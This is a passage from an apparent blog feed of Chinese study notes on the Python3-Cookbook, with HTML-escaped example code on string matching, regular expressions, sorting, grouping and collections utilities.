&#x3D; &#39;Spicy &quot;Jalape&amp;#241;o&amp;quot.&#39;from html.parser import HTMLParserp &#x3D; HTMLParser()p.unescape(s)# &#39;Spicy &quot;Jalapeño&quot;.&#39;t &#x3D; &#39;The prompt is &gt;&gt;&gt;&#39;from xml.sax.saxutils import unescapeunescape(t)# &#39;The prompt is &gt;&gt;&gt;&#39;</code></pre></div><h4 id="2-18-字符串令牌解析"><a href="#2-18-字符串令牌解析" class="headerlink" title="2.18 字符串令牌解析"></a>2.18 字符串令牌解析</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字符串令牌解析&quot;&quot;&quot;  模式对象scanner() 方法。 这个方法会创建一个 scanner 对象， 在这个对象上不断的调用 match() 方法会一步步的扫描目标文本，每步一个匹配。&quot;&quot;&quot;# 想将t转换为tokensimport ret &#x3D; &#39;foo &#x3D; 23 + 42 * 10&#39;tokens &#x3D; [(&#39;NAME&#39;, &#39;foo&#39;), (&#39;EQ&#39;, &#39;&#x3D;&#39;), (&#39;NUM&#39;, &#39;23&#39;), (&#39;PLUS&#39;, &#39;+&#39;),          (&#39;NUM&#39;, &#39;42&#39;), (&#39;TIMES&#39;, &#39;*&#39;), (&#39;NUM&#39;, &#39;10&#39;)]NAME &#x3D; r&#39;(?P&lt;NAME&gt;[a-zA-Z_][a-zA-Z_0-9]*)&#39;NUM &#x3D; r&#39;(?P&lt;NUM&gt;\d+)&#39;PLUS &#x3D; r&#39;(?P&lt;PLUS&gt;\+)&#39;TIMES &#x3D; r&#39;(?P&lt;TIMES&gt;\*)&#39;EQ &#x3D; r&#39;(?P&lt;EQ&gt;&#x3D;)&#39;WS &#x3D; r&#39;(?P&lt;WS&gt;\s+)&#39;master_pat &#x3D; re.compile(&#39;|&#39;.join([NAME, NUM, PLUS, TIMES, EQ, WS]))scanner &#x3D; master_pat.scanner(&#39;foo &#x3D; 42&#39;)scanner.match()# &lt;_sre.SRE_Match object at 0x100677738&gt;_.lastgroup, _.group()# (&#39;NAME&#39;, &#39;foo&#39;)scanner.match()# &lt;_sre.SRE_Match object at 0x100677738&gt;_.lastgroup, _.group()# (&#39;WS&#39;, &#39; &#39;)scanner.match()# &lt;_sre.SRE_Match object at 0x100677738&gt;_.lastgroup, _.group()# (&#39;EQ&#39;, &#39;&#x3D;&#39;)scanner.match()# &lt;_sre.SRE_Match object at 0x100677738&gt;_.lastgroup, _.group()# (&#39;WS&#39;, &#39; &#39;)scanner.match()# &lt;_sre.SRE_Match object at 0x100677738&gt;_.lastgroup, _.group()# (&#39;NUM&#39;, &#39;42&#39;)scanner.match()</code></pre></div><blockquote><p>参考：</p><p><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/">https://python3-cookbook.readthedocs.io/zh_CN/latest/</a></p><p><a href="https://github.com/yidao620c/python3-cookbook">https://github.com/yidao620c/python3-cookbook</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>使用手册</category>
      
      <category>学习笔记</category>
      
      <category>Python3-Cookbook</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python3-Cookbook第二章:字符串和文本(1)</title>
    <link href="/posts/f1c5e49e/"/>
    <url>/posts/f1c5e49e/</url>
    
    <content type="html"><![CDATA[<h4 id="2-1-使用多个界定符分割字符串"><a href="#2-1-使用多个界定符分割字符串" class="headerlink" title="2.1 使用多个界定符分割字符串"></a>2.1 使用多个界定符分割字符串</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 使用多个界定符分割字符串&quot;&quot;&quot; string 对象的 split() 方法只适应于非常简单的字符串分割情形。re.split() 方法可以更加灵活的切割字符串。&quot;&quot;&quot;import reline &#x3D; &#39;asdf fjdk; afed, fjek,asdf, foo&#39;# 表示可以通过;或,或空格或多个空格分隔re.split(r&#39;[;,\s]\s*&#39;, line)# Outputs# [&#39;asdf&#39;, &#39;fjdk&#39;, &#39;afed&#39;, &#39;fjek&#39;, &#39;asdf&#39;, &#39;foo&#39;]</code></pre></div><h4 id="2-2-字符串开头或结尾匹配"><a href="#2-2-字符串开头或结尾匹配" class="headerlink" title="2.2 字符串开头或结尾匹配"></a>2.2 字符串开头或结尾匹配</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字符串开头或结尾匹配&quot;&quot;&quot; 简单使用可以通过str.startswith() 或者是 str.endswith() 方法。如果需要多种匹配可以将匹配项作为元组（且必须是元组tuple()）传入上述方法。切片实现不优雅，正则实现较复杂，这种方式简单使用较方便。&quot;&quot;&quot;filename &#x3D; &#39;spam.txt&#39;filename.endswith(&#39;.txt&#39;)  # Truefilename.startswith(&#39;file:&#39;)  # Falseurl &#x3D; &#39;http:&#x2F;&#x2F;www.python.org&#39;url.startswith(&#39;http:&#39;)  # True[name for name in filenames if name.endswith((&#39;.c&#39;, &#39;.h&#39;))]</code></pre></div><h4 id="2-3-用Shell通配符匹配字符串"><a href="#2-3-用Shell通配符匹配字符串" class="headerlink" title="2.3 用Shell通配符匹配字符串"></a>2.3 用Shell通配符匹配字符串</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 用Shell通配符匹配字符串&quot;&quot;&quot; fnmatch 模块提供了两个函数—— fnmatch() 和 fnmatchcase() ，可以用来实现这样的匹配。fnmatch()大小写敏感根据系统不同而不尽相同。fnmatchcase()大小写敏感。功能强度介于字符串与正则之间。&quot;&quot;&quot;from fnmatch import fnmatch, fnmatchcasefnmatch(&#39;foo.txt&#39;, &#39;*.txt&#39;)  # Truefnmatch(&#39;foo.txt&#39;, &#39;?oo.txt&#39;)  # Truefnmatch(&#39;Dat45.csv&#39;, &#39;Dat[0-9]*&#39;)  # True</code></pre></div><h4 id="2-4-字符串匹配和搜索"><a href="#2-4-字符串匹配和搜索" class="headerlink" title="2.4 字符串匹配和搜索"></a>2.4 字符串匹配和搜索</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字符串匹配和搜索&quot;&quot;&quot; str.find() , str.endswith() , str.startswith() 或者类似的方法可做简单匹配。复杂匹配可以使用re模块与正则表达式。表达式多次使用可以预编译为模式对象。&quot;&quot;&quot;import retext1 &#x3D; &#39;11&#x2F;27&#x2F;2012&#39;text2 &#x3D; &#39;Nov 27, 2012&#39;if re.match(r&#39;\d+&#x2F;\d+&#x2F;\d+&#39;, text1):    print(&#39;yes&#39;)else:    print(&#39;no&#39;)if re.match(r&#39;\d+&#x2F;\d+&#x2F;\d+&#39;, text2):    print(&#39;yes&#39;)else:    print(&#39;no&#39;)# 预编译为模式对象# 字符串前的r表示字符串为raw string，即不会转义。如果此处没有r需要双反斜杠阅读性差。datepat &#x3D; re.compile(r&#39;\d+&#x2F;\d+&#x2F;\d+&#39;)if datepat.match(text1):    print(&#39;yes&#39;)else:    print(&#39;no&#39;)&quot;&quot;&quot; match() 总是从字符串开始去匹配，如果你想查找字符串任意部分的模式出现位置， 使用 findall() 方法去代替。如果你想以迭代方式返回匹配，可以使用 finditer() 方法来代替。&quot;&quot;&quot;text &#x3D; &#39;Today is 11&#x2F;27&#x2F;2012. PyCon starts 3&#x2F;13&#x2F;2013.&#39;datepat.findall(text)# Outputs# [&#39;11&#x2F;27&#x2F;2012&#39;, &#39;3&#x2F;13&#x2F;2013&#39;]&quot;&quot;&quot; 使用括号去捕获分组，分别将每个组的内容提取出来。&quot;&quot;&quot;datepat &#x3D; re.compile(r&#39;(\d+)&#x2F;(\d+)&#x2F;(\d+)&#39;)m &#x3D; datepat.match(&#39;11&#x2F;27&#x2F;2012&#39;)# &lt;_sre.SRE_Match object at 0x1005d2750&gt;m.group(0)  # &#39;11&#x2F;27&#x2F;2012&#39;m.group(1)  # &#39;11&#39;m.group(2)  # &#39;27&#39;m.group(3)  # &#39;2012&#39;m.groups()  # (&#39;11&#39;, &#39;27&#39;, &#39;2012&#39;)# Find all matches (notice splitting into tuples)text &#x3D; &#39;Today is 11&#x2F;27&#x2F;2012. PyCon starts 3&#x2F;13&#x2F;2013.&#39;datepat.findall(text)[(&#39;11&#39;, &#39;27&#39;, &#39;2012&#39;), (&#39;3&#39;, &#39;13&#39;, &#39;2013&#39;)]for month, day, year in datepat.findall(text):    print(&#39;&#123;&#125;-&#123;&#125;-&#123;&#125;&#39;.format(year, month, day))</code></pre></div><h4 id="2-5-字符串搜索和替换"><a href="#2-5-字符串搜索和替换" class="headerlink" title="2.5 字符串搜索和替换"></a>2.5 字符串搜索和替换</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字符串搜索和替换&quot;&quot;&quot; 简单字面模式可以使用str.replace()。对于复杂的模式，请使用 re 模块中的 sub() 函数。&quot;&quot;&quot;# str.replace()import retext &#x3D; &#39;yeah, but no, but yeah, but no, but yeah&#39;text.replace(&#39;yeah&#39;, &#39;yep&#39;)# &#39;yep, but no, but yep, but no, but yep&#39;# re.sub()text &#x3D; &#39;Today is 11&#x2F;27&#x2F;2012. PyCon starts 3&#x2F;13&#x2F;2013.&#39;re.sub(r&#39;(\d+)&#x2F;(\d+)&#x2F;(\d+)&#39;, r&#39;\3-\1-\2&#39;, text)# &#39;Today is 2012-11-27. PyCon starts 2013-3-13.&#39;# sub() 函数中的第一个参数是被匹配的模式，第二个参数是替换模式。反斜杠数字比如 \3 指向前面模式的捕获组号。# 预编译datepat &#x3D; re.compile(r&#39;(\d+)&#x2F;(\d+)&#x2F;(\d+)&#39;)datepat.sub(r&#39;\3-\1-\2&#39;, text)</code></pre></div><h4 id="2-6-字符串忽略大小写的搜索替换"><a href="#2-6-字符串忽略大小写的搜索替换" class="headerlink" title="2.6 字符串忽略大小写的搜索替换"></a>2.6 字符串忽略大小写的搜索替换</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字符串忽略大小写的搜索替换&quot;&quot;&quot; 为了在文本操作时忽略大小写，你需要在使用 re 模块的时候给这些操作提供 re.IGNORECASE 标志参数。&quot;&quot;&quot;import retext &#x3D; &#39;UPPER PYTHON, lower python, Mixed Python&#39;re.findall(&#39;python&#39;, text, flags&#x3D;re.IGNORECASE)# [&#39;PYTHON&#39;, &#39;python&#39;, &#39;Python&#39;]re.sub(&#39;python&#39;, &#39;snake&#39;, text, flags&#x3D;re.IGNORECASE)# &#39;UPPER snake, lower snake, Mixed snake&#39;</code></pre></div><h4 id="2-7-最短模式匹配"><a href="#2-7-最短模式匹配" class="headerlink" title="2.7 最短模式匹配"></a>2.7 最短模式匹配</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 最短模式匹配&quot;&quot;&quot; 通过正则表达式的限定符?改变匹配的模式为最短匹配。&quot;(.*)&quot;表示最长匹配双引号内的内容。&quot;(.*?)&quot;表示最短匹配双引号内的内容。&quot;&quot;&quot;import restr_pat &#x3D; re.compile(r&#39;&quot;(.*)&quot;&#39;)text1 &#x3D; &#39;Computer says &quot;no.&quot;&#39;str_pat.findall(text1)# [&#39;no.&#39;]text2 &#x3D; &#39;Computer says &quot;no.&quot; Phone says &quot;yes.&quot;&#39;str_pat.findall(text2)# [&#39;no.&quot; Phone says &quot;yes.&#39;]str_pat &#x3D; re.compile(r&#39;&quot;(.*?)&quot;&#39;)str_pat.findall(text2)# [&#39;no.&#39;, &#39;yes.&#39;]</code></pre></div><h4 id="2-8-多行匹配模式"><a href="#2-8-多行匹配模式" class="headerlink" title="2.8 多行匹配模式"></a>2.8 多行匹配模式</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 多行匹配模式&quot;&quot;&quot; 当你用点(.)去匹配任意字符的时候，发现点(.)不能匹配换行符的事实。其中一种场景就是匹配C语言的跨行注释。&quot;&quot;&quot;import re# 该模式对象只能匹配未换行的注释comment &#x3D; re.compile(r&#39;&#x2F;\*(.*?)\*&#x2F;&#39;)# 修改模式增加对换行的支持# (?:.|*?)中，?:表示匹配但不获取(非捕获组)，|表示或关系，*？表示任意数量但最短匹配comment &#x3D; re.compile(r&#39;&#x2F;\*((?:.|\n)*?)\*&#x2F;&#39;)</code></pre></div><h4 id="2-9-将Unicode文本标准化"><a href="#2-9-将Unicode文本标准化" class="headerlink" title="2.9 将Unicode文本标准化"></a>2.9 将Unicode文本标准化</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 将Unicode文本标准化&quot;&quot;&quot; 使用unicodedata模块将文本标准化&quot;&quot;&quot;import unicodedatas1 &#x3D; &#39;Spicy Jalape\u00f1o&#39;  # &#39;Spicy Jalapeño&#39;s2 &#x3D; &#39;Spicy Jalapen\u0303o&#39;  # &#39;Spicy Jalapeño&#39;s1 &#x3D;&#x3D; s2  # Falset1 &#x3D; unicodedata.normalize(&#39;NFC&#39;, s1)t2 &#x3D; unicodedata.normalize(&#39;NFC&#39;, s2)t1 &#x3D;&#x3D; t2  # True</code></pre></div><h4 id=""><a href="#" class="headerlink" title=""></a></h4><blockquote><p>参考：</p><p><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/">https://python3-cookbook.readthedocs.io/zh_CN/latest/</a></p><p><a href="https://github.com/yidao620c/python3-cookbook">https://github.com/yidao620c/python3-cookbook</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>使用手册</category>
      
      <category>学习笔记</category>
      
      <category>Python3-Cookbook</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python3-Cookbook第一章:数据结构和算法(2)</title>
    <link href="/posts/d590dae/"/>
    <url>/posts/d590dae/</url>
    
    <content type="html"><![CDATA[<h4 id="1-11-命名切片"><a href="#1-11-命名切片" class="headerlink" title="1.11 命名切片"></a>1.11 命名切片</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 命名切片# 假定你要从一个记录（比如文件或其他类似格式）中的某些固定位置提取字段# 与其record &#x3D; &#39;....................100 .......513.25 ..........&#39;cost &#x3D; int(record[20:23]) * float(record[31:37])# 不如SHARES &#x3D; slice(20, 23)PRICE &#x3D; slice(31, 37)cost &#x3D; int(record[SHARES]) * float(record[PRICE])</code></pre></div><h4 id="1-12-序列中出现次数最多的元素"><a href="#1-12-序列中出现次数最多的元素" class="headerlink" title="1.12 序列中出现次数最多的元素"></a>1.12 序列中出现次数最多的元素</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 序列中出现次数最多的元素&quot;&quot;&quot; collections.Counter 类就是专门为这类问题而设计的， 它甚至有一个有用的 most_common() 方法直接给了你答案。&quot;&quot;&quot;# 取出出现频率最高的单词from collections import Counterwords &#x3D; [    &#39;look&#39;, &#39;into&#39;, &#39;my&#39;, &#39;eyes&#39;, &#39;look&#39;, &#39;into&#39;, &#39;my&#39;, &#39;eyes&#39;,    &#39;the&#39;, &#39;eyes&#39;, &#39;the&#39;, &#39;eyes&#39;, &#39;the&#39;, &#39;eyes&#39;, &#39;not&#39;, &#39;around&#39;, &#39;the&#39;,    &#39;eyes&#39;, &quot;don&#39;t&quot;, &#39;look&#39;, &#39;around&#39;, &#39;the&#39;, &#39;eyes&#39;, &#39;look&#39;, &#39;into&#39;,    &#39;my&#39;, &#39;eyes&#39;, &quot;you&#39;re&quot;, &#39;under&#39;]word_counts &#x3D; Counter(words)# 出现频率最高的3个单词top_three &#x3D; word_counts.most_common(3)print(top_three)# Outputs [(&#39;eyes&#39;, 8), (&#39;the&#39;, 5), (&#39;look&#39;, 4)]&quot;&quot;&quot; collections.Counter底层实际上是一个元素作为key，出现次数作为value的dict。神奇的是还能进行数学运算操作结合。&quot;&quot;&quot;morewords &#x3D; [&#39;why&#39;,&#39;are&#39;,&#39;you&#39;,&#39;not&#39;,&#39;looking&#39;,&#39;in&#39;,&#39;my&#39;,&#39;eyes&#39;]a &#x3D; Counter(words)b &#x3D; Counter(morewords)a# Outputs# Counter(&#123;&#39;eyes&#39;: 8, &#39;the&#39;: 5, &#39;look&#39;: 4, &#39;into&#39;: 3, &#39;my&#39;: 3, &#39;around&#39;: 2,&quot;you&#39;re&quot;: 1, &quot;don&#39;t&quot;: 1, &#39;under&#39;: 1, &#39;not&#39;: 1&#125;)b# Outputs# Counter(&#123;&#39;eyes&#39;: 1, &#39;looking&#39;: 1, &#39;are&#39;: 1, &#39;in&#39;: 1, &#39;not&#39;: 1, &#39;you&#39;: 1,&#39;my&#39;: 1, &#39;why&#39;: 1&#125;)# Combine countsc &#x3D; a + bc# Outputs# Counter(&#123;&#39;eyes&#39;: 9, &#39;the&#39;: 5, &#39;look&#39;: 4, &#39;my&#39;: 4, &#39;into&#39;: 3, &#39;not&#39;: 2,&#39;around&#39;: 2, &quot;you&#39;re&quot;: 1, &quot;don&#39;t&quot;: 1, &#39;in&#39;: 1, &#39;why&#39;: 1,&#39;looking&#39;: 1, &#39;are&#39;: 1, &#39;under&#39;: 1,&#39;you&#39;: 1&#125;)# Subtract countsd &#x3D; a - bd# Outputs# Counter(&#123;&#39;eyes&#39;: 7, &#39;the&#39;: 5, &#39;look&#39;: 4, &#39;into&#39;: 3, &#39;my&#39;: 2, &#39;around&#39;: 2,&quot;you&#39;re&quot;: 1, &quot;don&#39;t&quot;: 1, &#39;under&#39;: 1&#125;)</code></pre></div><h4 id="1-13-通过某个关键字排序一个字典列表"><a href="#1-13-通过某个关键字排序一个字典列表" class="headerlink" title="1.13 通过某个关键字排序一个字典列表"></a>1.13 通过某个关键字排序一个字典列表</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 通过某个关键字排序一个字典列表&quot;&quot;&quot; 使用 operator 模块的 itemgetter 函数。排序过程中，相当于key使用的itemgetter获取到了dict中对应key的value进行排序。itemgetter同时支持多个keys。&quot;&quot;&quot;from operator import itemgetterrows &#x3D; [    &#123;&#39;fname&#39;: &#39;Brian&#39;, &#39;lname&#39;: &#39;Jones&#39;, &#39;uid&#39;: 1003&#125;,    &#123;&#39;fname&#39;: &#39;David&#39;, &#39;lname&#39;: &#39;Beazley&#39;, &#39;uid&#39;: 1002&#125;,    &#123;&#39;fname&#39;: &#39;John&#39;, &#39;lname&#39;: &#39;Cleese&#39;, &#39;uid&#39;: 1001&#125;,    &#123;&#39;fname&#39;: &#39;Big&#39;, &#39;lname&#39;: &#39;Jones&#39;, &#39;uid&#39;: 1004&#125;]rows_by_fname &#x3D; sorted(rows, key&#x3D;itemgetter(&#39;fname&#39;))rows_by_uid &#x3D; sorted(rows, key&#x3D;itemgetter(&#39;uid&#39;))print(rows_by_fname)print(rows_by_uid)rows_by_lfname &#x3D; sorted(rows, key&#x3D;itemgetter(&#39;lname&#39;, &#39;fname&#39;))print(rows_by_lfname)&quot;&quot;&quot; 在上面例子中， rows 被传递给接受一个关键字参数的 sorted() 内置函数。 这个参数是 callable 类型，并且从 rows 中接受一个单一元素，然后返回被用来排序的值。itemgetter() 函数就是负责创建这个 callable 对象的。本例中的操作基本等同于key中使用lambda定义，但是效率更高。同样适用于max，min等。&quot;&quot;&quot;rows_by_fname &#x3D; sorted(rows, key&#x3D;lambda r: r[&#39;fname&#39;])rows_by_lfname &#x3D; sorted(rows, key&#x3D;lambda r: (r[&#39;lname&#39;], r[&#39;fname&#39;]))</code></pre></div><h4 id="1-14-排序不支持原生比较的对象"><a href="#1-14-排序不支持原生比较的对象" class="headerlink" title="1.14 排序不支持原生比较的对象"></a>1.14 排序不支持原生比较的对象</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 排序不支持原生比较的对象&quot;&quot;&quot; 关键在于传入callable的key参数时，获取到非原生对象的具体变量。可以通过lambda或者operator中的attrgetter。&quot;&quot;&quot;from operator import attrgetterclass User:    def __init__(self, user_id):        self.user_id &#x3D; user_id    def __repr__(self):        return &#39;User(&#123;&#125;)&#39;.format(self.user_id)users &#x3D; [User(23), User(3), User(99)]# Method 1print(sorted(users, key&#x3D;lambda u: u.user_id))# Method 2print(sorted(users, key&#x3D;attrgetter(&#39;user_id&#39;)))</code></pre></div><h4 id="1-15-通过某个字段将记录分组"><a href="#1-15-通过某个字段将记录分组" class="headerlink" title="1.15 通过某个字段将记录分组"></a>1.15 通过某个字段将记录分组</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 通过某个字段将记录分组&quot;&quot;&quot; 使用itertools.groupby()函数，务必记得需要先排序&quot;&quot;&quot;from collections import defaultdictfrom itertools import groupbyfrom operator import itemgetterrows &#x3D; [    &#123;&#39;address&#39;: &#39;5412 N CLARK&#39;, &#39;date&#39;: &#39;07&#x2F;01&#x2F;2012&#39;&#125;,    &#123;&#39;address&#39;: &#39;5148 N CLARK&#39;, &#39;date&#39;: &#39;07&#x2F;04&#x2F;2012&#39;&#125;,    &#123;&#39;address&#39;: &#39;5800 E 58TH&#39;, &#39;date&#39;: &#39;07&#x2F;02&#x2F;2012&#39;&#125;,    &#123;&#39;address&#39;: &#39;2122 N CLARK&#39;, &#39;date&#39;: &#39;07&#x2F;03&#x2F;2012&#39;&#125;,    &#123;&#39;address&#39;: &#39;5645 N RAVENSWOOD&#39;, &#39;date&#39;: &#39;07&#x2F;02&#x2F;2012&#39;&#125;,    &#123;&#39;address&#39;: &#39;1060 W ADDISON&#39;, &#39;date&#39;: &#39;07&#x2F;02&#x2F;2012&#39;&#125;,    &#123;&#39;address&#39;: &#39;4801 N BROADWAY&#39;, &#39;date&#39;: &#39;07&#x2F;01&#x2F;2012&#39;&#125;,    &#123;&#39;address&#39;: &#39;1039 W GRANVILLE&#39;, &#39;date&#39;: &#39;07&#x2F;04&#x2F;2012&#39;&#125;,]# 需要预先按照想要分组的item排序rows.sort(key&#x3D;itemgetter(&#39;date&#39;))# 分组for date, items in groupby(rows, key&#x3D;itemgetter(&#39;date&#39;)):    print(date)    for i in items:        print(&#39; &#39;, i)&quot;&quot;&quot; 输出结果07&#x2F;01&#x2F;2012  &#123;&#39;date&#39;: &#39;07&#x2F;01&#x2F;2012&#39;, &#39;address&#39;: &#39;5412 N CLARK&#39;&#125;  &#123;&#39;date&#39;: &#39;07&#x2F;01&#x2F;2012&#39;, &#39;address&#39;: &#39;4801 N BROADWAY&#39;&#125;07&#x2F;02&#x2F;2012  &#123;&#39;date&#39;: &#39;07&#x2F;02&#x2F;2012&#39;, &#39;address&#39;: &#39;5800 E 58TH&#39;&#125;  &#123;&#39;date&#39;: &#39;07&#x2F;02&#x2F;2012&#39;, &#39;address&#39;: &#39;5645 N RAVENSWOOD&#39;&#125;  &#123;&#39;date&#39;: &#39;07&#x2F;02&#x2F;2012&#39;, &#39;address&#39;: &#39;1060 W ADDISON&#39;&#125;07&#x2F;03&#x2F;2012  &#123;&#39;date&#39;: &#39;07&#x2F;03&#x2F;2012&#39;, &#39;address&#39;: &#39;2122 N CLARK&#39;&#125;07&#x2F;04&#x2F;2012  &#123;&#39;date&#39;: &#39;07&#x2F;04&#x2F;2012&#39;, &#39;address&#39;: &#39;5148 N CLARK&#39;&#125;  &#123;&#39;date&#39;: &#39;07&#x2F;04&#x2F;2012&#39;, &#39;address&#39;: &#39;1039 W GRANVILLE&#39;&#125;&quot;&quot;&quot;&quot;&quot;&quot; 如果需要保持序列顺序，则可以通过1-6中的defaultdict，将想要分组的item作为其中的key，然后将整条记录append到对应item的组别中。&quot;&quot;&quot;rows_by_date &#x3D; defaultdict(list)for row in rows:    rows_by_date[row[&#39;date&#39;]].append(row)</code></pre></div><h4 id="1-16-过滤序列元素"><a href="#1-16-过滤序列元素" class="headerlink" title="1.16 过滤序列元素"></a>1.16 过滤序列元素</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 过滤序列元素&quot;&quot;&quot; 可通过列表推导式达到目的，好处是同时还能充当简单的数据住转换。但是当元素结果集很大时则很占内存。可以将过滤代码放到一个函数中， 然后使用内建的 filter() 函数。&quot;&quot;&quot;# filter得到的是一个迭代器，如果想得到列表还需要进行list()转换values &#x3D; [&#39;1&#39;, &#39;2&#39;, &#39;-3&#39;, &#39;-&#39;, &#39;4&#39;, &#39;N&#x2F;A&#39;, &#39;5&#39;]def is_int(val):    try:        x &#x3D; int(val)        return True    except ValueError:        return Falseivals &#x3D; list(filter(is_int, values))print(ivals)# Outputs [&#39;1&#39;, &#39;2&#39;, &#39;-3&#39;, &#39;4&#39;, &#39;5&#39;]&quot;&quot;&quot; 列表推导式1. [i for i in range(k) if condition]：此时if起条件判断作用，满足条件的，将被返回成为最终生成的列表的一员。2. [i if condition else exp for exp]：此时if...else被用来赋值，满足条件的i以及else被用来生成最终的列表。&quot;&quot;&quot;print([i for i in range(10) if i % 2 &#x3D;&#x3D; 0])print([i if i &#x3D;&#x3D; 0 else 100 for i in range(10)])# Outputs[0, 2, 4, 6, 8][0, 100, 100, 100, 100, 100, 100, 100, 100, 100]</code></pre></div><h4 id="1-17-从字典中提取子集"><a href="#1-17-从字典中提取子集" class="headerlink" title="1.17 从字典中提取子集"></a>1.17 从字典中提取子集</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 从字典中提取子集# 使用字典推导prices &#x3D; &#123;    &#39;ACME&#39;: 45.23,    &#39;AAPL&#39;: 612.78,    &#39;IBM&#39;: 205.55,    &#39;HPQ&#39;: 37.20,    &#39;FB&#39;: 10.75&#125;# 取出value大于200的p1 &#x3D; &#123;key: value for key, value in prices.items() if value &gt; 200&#125;# 取出在name列表中的键值对tech_names &#x3D; &#123;&#39;AAPL&#39;, &#39;IBM&#39;, &#39;HPQ&#39;, &#39;MSFT&#39;&#125;p2 &#x3D; &#123;key: value for key, value in prices.items() if key in tech_names&#125;</code></pre></div><h4 id="1-18-映射名称到序列元素"><a href="#1-18-映射名称到序列元素" class="headerlink" title="1.18 映射名称到序列元素"></a>1.18 映射名称到序列元素</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 映射名称到序列元素&quot;&quot;&quot; 使用collections.namedtuple()，函数使用即在初始化的时候传入一个类型名与需要的下标字段。通过使用下标对元组中的内容进行组合操作会表意不清晰。命名元组与字典功能很接近，但是要更节省内存。&quot;&quot;&quot;from collections import namedtupleSubscriber &#x3D; namedtuple(&#39;Subscriber&#39;, [&#39;addr&#39;, &#39;joined&#39;])sub &#x3D; Subscriber(&#39;jonesy@example.com&#39;, &#39;2012-10-19&#39;)print(sub)  # Subscriber(addr&#x3D;&#39;jonesy@example.com&#39;, joined&#x3D;&#39;2012-10-19&#39;)print(sub.addr)  # jonesy@example.comprint(sub.joined)  # 2012-10-19# 举例使用，在命名元组中使用下标。# 实际上本身对records中的每条记录内容都知道是什么，只是为了表意清楚，使用有名字的下标进行计算。Stock &#x3D; namedtuple(&#39;Stock&#39;, [&#39;name&#39;, &#39;shares&#39;, &#39;price&#39;])def compute_cost(records):    total &#x3D; 0.0    for rec in records:        s &#x3D; Stock(*rec)        total +&#x3D; s.shares * s.price    return total</code></pre></div><h4 id="1-19-转换并同时计算数据"><a href="#1-19-转换并同时计算数据" class="headerlink" title="1.19 转换并同时计算数据"></a>1.19 转换并同时计算数据</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 转换并同时计算数据&quot;&quot;&quot; 练习使用生成器表达式参数&quot;&quot;&quot;# 计算平方和import osnums &#x3D; [1, 2, 3, 4, 5]s &#x3D; sum(x * x for x in nums)# 查看文件夹中是否包含.py后缀文件files &#x3D; os.listdir(&#39;dirname&#39;)if any(name.endswith(&#39;.py&#39;) for name in files):    print(&#39;There be python!&#39;)else:    print(&#39;Sorry, no python.&#39;)# 计算字典列表中某个key最小的valueportfolio &#x3D; [    &#123;&#39;name&#39;: &#39;GOOG&#39;, &#39;shares&#39;: 50&#125;,    &#123;&#39;name&#39;: &#39;YHOO&#39;, &#39;shares&#39;: 75&#125;,    &#123;&#39;name&#39;: &#39;AOL&#39;, &#39;shares&#39;: 20&#125;,    &#123;&#39;name&#39;: &#39;SCOX&#39;, &#39;shares&#39;: 65&#125;]min_shares &#x3D; min(s[&#39;shares&#39;] for s in portfolio)# 对于min() 和 max() 它们接受的一个 key 关键字参数或许对你很有帮助</code></pre></div><h4 id="1-20-合并多个字典或映射"><a href="#1-20-合并多个字典或映射" class="headerlink" title="1.20 合并多个字典或映射"></a>1.20 合并多个字典或映射</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 合并多个字典或映射&quot;&quot;&quot; 使用collections 模块中的 ChainMap 类&quot;&quot;&quot;from collections import ChainMapa &#x3D; &#123;&#39;x&#39;: 1, &#39;z&#39;: 3&#125;b &#x3D; &#123;&#39;y&#39;: 2, &#39;z&#39;: 4&#125;c &#x3D; ChainMap(a, b)  # 先从a找，再从b找print(c[&#39;x&#39;])  # Outputs 1 (from a)print(c[&#39;y&#39;])  # Outputs 2 (from b)print(c[&#39;z&#39;])  # Outputs 3 (from a)&quot;&quot;&quot; 通过这种操作的字典并不是真正的合并了，只是内部创建了容纳这些字典的列表，大部分字典操作可以正常使用。对于新字典的更新与删除会影响列表中的第一个字典。而使用update()方法，原字典的更新不会影响到新的合并字典。&quot;&quot;&quot;a &#x3D; &#123;&#39;x&#39;: 1, &#39;z&#39;: 3&#125;b &#x3D; &#123;&#39;y&#39;: 2, &#39;z&#39;: 4&#125;merged &#x3D; dict(b)merged.update(a)merged[&#39;x&#39;]  # 1merged[&#39;y&#39;]  # 2merged[&#39;z&#39;]  # 3a[&#39;x&#39;] &#x3D; 13merged[&#39;x&#39;]  # 1</code></pre></div><blockquote><p>参考：</p><p><a 